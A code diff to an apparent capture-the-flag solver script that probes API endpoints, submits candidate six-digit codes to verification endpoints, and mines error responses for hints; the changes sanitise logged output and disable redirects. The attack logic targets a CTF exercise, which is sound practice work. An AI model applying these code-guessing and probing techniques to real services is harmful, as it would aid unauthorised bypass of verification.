@@ -75,7 +75,8 @@ def try_api_endpoints():
             r = session.get(BASE_URL + ep, timeout=5)
             if r.status_code == 200:
                 print(f"[+] API endpoint found: {ep}")
-                print(f"    Response: {r.text[:200]}")
+                safe_preview = r.text[:200].replace('\n', ' ').replace('\r', '')
+                print(f"    Response: {safe_preview}")
 
                 # Try to extract 6-digit code from response
                 m = re.search(r'\b(\d{6})\b', r.text)
@@ -107,32 +108,32 @@ def verify_code(code, extra_info=None):
             r = session.post(BASE_URL + ep,
                            data={"code": code},
                            timeout=10,
-                           allow_redirects=True)
+                           allow_redirects=False)
 
             if r.status_code in [200, 302]:
                 text = r.text.lower()
                 if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success', 'congratulation']):
-                    print(f"[!!!] FLAG FOUND via POST to {ep}!")
+                    print("[!!!] FLAG FOUND via POST to endpoint!")
                     # Extract flag
                     flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                     if flag_match:
                         return flag_match.group(0)
-                    return r.text
+                    return "[flag found - check response]"
 
             # Try POST with JSON
             r = session.post(BASE_URL + ep,
                            json={"code": code},
                            timeout=10,
-                           allow_redirects=True)
+                           allow_redirects=False)
 
             if r.status_code in [200, 302]:
                 text = r.text.lower()
                 if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success']):
-                    print(f"[!!!] FLAG FOUND via JSON POST to {ep}!")
+                    print("[!!!] FLAG FOUND via JSON POST to endpoint!")
                     flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                     if flag_match:
                         return flag_match.group(0)
-                    return r.text
+                    return "[flag found - check response]"
 
         except requests.RequestException:
             pass
@@ -216,7 +217,8 @@ def timing_attack_on_error_messages():
             else:
                 r = session.post(BASE_URL + "/verify", data={"code": tc}, timeout=5)
 
-            print(f"  Input={repr(tc)}: status={r.status_code}, body={r.text[:200]}")
+            safe_body = r.text[:200].replace('\n', ' ').replace('\r', '')
+            print(f"  Input={repr(tc)}: status={r.status_code}, body={safe_body}")
 
             # Look for any code hints in error response
             m = re.search(r'\b(\d{6})\b', r.text)
